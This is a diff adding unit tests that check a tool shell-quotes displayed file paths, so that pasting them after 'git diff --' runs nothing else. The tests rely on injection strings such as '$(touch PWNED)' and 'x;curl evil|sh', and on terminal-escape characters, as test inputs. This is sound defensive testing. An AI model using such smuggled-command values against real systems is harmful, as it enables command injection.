@@ -10,6 +10,7 @@ import io
 import os
 import pty
 import select
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -471,6 +472,106 @@ class Handles(Base):
         self.assertNotIn("12345", out.split("paths:")[1].split("paths left out")[0])
         self.assertNotIn("secret-list-entry", out.split("paths:")[1].split("paths left out")[0])
         self.assertNotIn("secret-dict-value", out.split("paths:")[1].split("paths left out")[0])
+
+    # -- paths a shell would read as syntax (plan `2026-11-07-handle-paths-are-shell-safe`, increment A) ---------------------------
+    SAFE_NAMES = ("a.txt", "dir/b.py", "x-y_z.md", "v1.2+3@4%5,6", "-x", "A/B/c")
+    HOSTILE = ("a;b", "$(touch PWNED)", "`touch PWNED`", "a b", "a|b", "a&b", "a>b", "a<b", "it's", 'a"b', "a\\b", "a*b", "a?b", "a!b",
+               "a#b", "~x", "{a,b}", "=ls", "a=b", "a:b", "x;curl evil|sh", "has space;x", "a\\", "'", "''", "a'b'c", "$HOME", "$'x'",
+               "a\\'b", "(a)", "[a]", "^a", "two  spaces", " lead", "trail ", "a{b", "a}b", "{", "}", "")
+
+    def shown_paths(self, names):
+        """The words the tool prints for the given paths, one per line of the list."""
+        self.add(handle_row(1, paths=tuple(names), dropped=0))
+        _, out, _ = self.run_tool("s")
+        lines = out.splitlines()
+        start = lines.index("paths:") + 1
+        words = []
+        for line in lines[start:]:
+            if not line.startswith("  "):
+                break
+            words.append(line[2:])
+        return words, out
+
+    def test_a_path_of_the_safe_alphabet_is_shown_unchanged(self):
+        words, _ = self.shown_paths(self.SAFE_NAMES)
+        self.assertEqual(list(self.SAFE_NAMES), words)
+
+    def test_a_path_with_any_other_printable_character_is_shown_as_one_single_quoted_word(self):
+        words, _ = self.shown_paths(self.HOSTILE)
+        self.assertEqual(len(self.HOSTILE), len(words))
+        for name, word in zip(self.HOSTILE, words):
+            self.assertTrue(word.startswith("'") and word.endswith("'") and len(word) >= 2, (name, word))
+            self.assertEqual(name, word[1:-1].replace("'\"'\"'", "'"), (name, word))
+
+    def test_an_apostrophe_is_written_with_the_quote_break_sequence_and_a_backslash_is_not_doubled(self):
+        words, _ = self.shown_paths(("it's", "a\\b"))
+        self.assertEqual(["'it'\"'\"'s'", "'a\\b'"], words)
+
+    def test_the_equals_sign_and_the_colon_are_quoted_though_python_would_leave_them_bare(self):
+        words, _ = self.shown_paths(("=ls", "a=b", "a:b"))
+        self.assertEqual(["'=ls'", "'a=b'", "'a:b'"], words)
+
+    def test_a_path_with_a_control_or_non_ascii_character_is_escaped_and_marked_not_for_pasting(self):
+        words, out = self.shown_paths(("a\x1b[2Jb", "c\u202ed", "e\nf", "g\x00h", "caf\u00e9"))
+        for word in words:
+            self.assertTrue(word.endswith(" [not for pasting]"), word)
+        self.assertIn("a\\x1b[2Jb", words[0])
+        self.assertIn("\\u202e", words[1])
+        for char in out:
+            self.assertTrue(char == "\n" or " " <= char <= "~", repr(char))
+
+    def test_a_path_over_256_characters_is_not_shown_and_the_count_is(self):
+        words, _ = self.shown_paths(("x" * 300, "ok.txt"))
+        self.assertEqual(["(a path of 300 characters; not shown)", "ok.txt"], words)
+
+    def test_the_judging_line_says_that_paths_are_quoted(self):
+        _, out = self.shown_paths(("a;b",))
+        line = [line for line in out.splitlines() if line.startswith("to judge it:")][0]
+        self.assertIn("single quotes", line)
+        self.assertIn("git diff -- <the paths>", line)
+
+    def run_in_shell(self, shell, flags, words):
+        """What a fake `git` receives when the shown words are put on a command line after `git diff --`, and whether anything else ran."""
+        work = tempfile.mkdtemp()
+        self.addCleanup(lambda: shutil.rmtree(work, ignore_errors=True))
+        bindir = os.path.join(work, "bin")
+        os.mkdir(bindir)
+        record = os.path.join(work, "args")
+        with open(os.path.join(bindir, "git"), "w") as handle:
+            handle.write("#!/bin/sh\nfor a in \"$@\"; do printf '%s\\0' \"$a\" >> " + record + "; done\n")
+        os.chmod(os.path.join(bindir, "git"), 0o755)
+        env = {"PATH": bindir + ":/usr/bin:/bin", "HOME": work}
+        line = "git diff -- " + " ".join(words)
+        run = subprocess.run([shell, *flags, "-c", line], cwd=work, env=env, capture_output=True, timeout=60)
+        args = open(record, "rb").read().split(b"\0")[:-1] if os.path.exists(record) else []
+        return run, [a.decode() for a in args], sorted(os.listdir(work))
+
+    def test_the_shown_words_give_a_shell_exactly_the_paths_and_run_nothing_else(self):
+        printable = [name for name in self.HOSTILE + self.SAFE_NAMES if name != ""]
+        words, _ = self.shown_paths(printable)
+        zsh_options = ("-f", "-o", "rcquotes", "-o", "globsubst", "-o", "shwordsplit", "-o", "extendedglob", "-o", "braceccl")
+        ran = []
+        for shell, flags in (("/bin/sh", ()), ("/bin/bash", ()), ("/bin/zsh", ("-f",)), ("/bin/zsh", zsh_options)):
+            with self.subTest(shell + " " + " ".join(flags)):
+                if not os.path.exists(shell):
+                    self.skipTest(shell + " is not installed: its case is not tested here")
+                ran.append(shell)
+                run, args, left = self.run_in_shell(shell, flags, words)
+                self.assertEqual(0, run.returncode, run.stderr)
+                self.assertEqual(["diff", "--"] + printable, args)
+                self.assertEqual(["args", "bin"], left, "nothing but the fake git ran (a `touch PWNED` would leave a file)")
+        self.assertTrue(ran, "no shell to test with")
+
+    def test_the_equals_sign_form_is_the_one_that_would_have_run_in_zsh(self):
+        """Why `=` is quoted: in zsh a bare word that starts with `=` is replaced by the path of a command (`=ls`). The test shows the
+        hazard on the real shell and that the shown word avoids it."""
+        if not os.path.exists("/bin/zsh"):
+            self.skipTest("no zsh")
+        run, args, _ = self.run_in_shell("/bin/zsh", ("-f",), ["=ls"])
+        self.assertNotEqual(["diff", "--", "=ls"], args, "a bare =ls does not reach the command as it is: zsh expands it")
+        words, _ = self.shown_paths(("=ls",))
+        run, args, _ = self.run_in_shell("/bin/zsh", ("-f",), words)
+        self.assertEqual((0, ["diff", "--", "=ls"]), (run.returncode, args))
 
     def test_f_shows_the_facts_of_a_handle_cleaned(self):
         self.add(handle_row(1, paths=("a.txt",)))
